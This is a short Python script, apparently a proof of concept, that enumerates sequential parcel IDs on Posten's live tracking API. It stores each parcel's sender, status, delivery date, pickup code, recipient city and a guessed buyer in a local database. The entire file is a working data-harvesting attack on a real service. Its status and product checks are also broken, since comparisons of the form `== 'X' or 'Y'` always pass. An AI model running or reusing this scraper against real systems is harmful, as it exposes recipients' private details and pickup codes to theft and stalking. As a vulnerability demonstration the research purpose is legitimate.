import requests, json, sqlite3 as sl

"""
A simple python script that loops through tracking numbers and add different
parameters into a database. Was used to prove a vulnerability in Posten's
tracking service.
"""


consignmentID = 123456789  # add a valid tracking/consignmentID

con = sl.connect('database_name.db')

with con:
    con.execute("""
        CREATE TABLE IF NOT EXISTS Package (
            consignmentId INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
            senderName TEXT,
            status TEXT,
            ETA DATE,
            pickupCode TEXT,
            city TEXT,
            productName TEXT,
            possibleBuyer TEXT
        );
    """)

sql = 'INSERT INTO PACKAGE (consignmentId, senderName, status, ETA, pickupCode, city, productName, possibleBuyer) values(?, ?, ?, ?, ?, ?, ?, ?)'

for i in range(consignmentID,
               consignmentID+1000, 1):

    url = f'https://sporing.posten.no/tracking/api/fetch/{i}?lang=en'

    try:
        r = requests.get(url)
        parsed = json.loads(r.text)

        # check if valid json data
        if parsed['apiVersion'] == "2":
            # check if package is in transit or ready for pickup, i.e. not delivered
            if parsed['consignmentSet'][0]['packageSet'][0]['eventSet'][0]['status'] == 'IN_TRANSIT' or 'READY_FOR_PICKUP':
                consignmentId = parsed['consignmentSet'][0]['consignmentId']

                # check if package is returning
                if parsed['consignmentSet'][0]['packageSet'][0]['productName'] == "Service Parcel Return Service" or "Servicepakke returservice":
                    buyer = "NULL"
                else:
                    # check possible buyer
                    for j in range(int(consignmentId) + 1, int(consignmentId) + 18, 1):
                        url1 = f'https://sporing.posten.no/tracking/api/fetch/{j}?lang=no'
                        try:
                            r1 = requests.get(url1)
                            parsed1 = json.loads(r1.text)
                            print(parsed1)
                            if parsed1['apiVersion'] == "2":
                                buyer = parsed1['consignmentSet'][0]['packageSet'][0]['senderName']
                                break
                        except:
                            continue

                # save to database
                try:
                    data = [(parsed['consignmentSet'][0]['consignmentId'],
                             parsed['consignmentSet'][0]['packageSet'][0]['senderName'],
                             parsed['consignmentSet'][0]['packageSet'][0]['eventSet'][0]['status'],
                             parsed['consignmentSet'][0]['packageSet'][0]['dateOfEstimatedDelivery'],
                             parsed['consignmentSet'][0]['packageSet'][0]['pickupCode'],
                             parsed['consignmentSet'][0]['packageSet'][0]['recipientAddress']['city'],
                             parsed['consignmentSet'][0]['packageSet'][0]['productName'],
                             buyer)
                            ]
                    with con:
                        con.executemany(sql, data)
                except:
                    pass
    except:
        continue

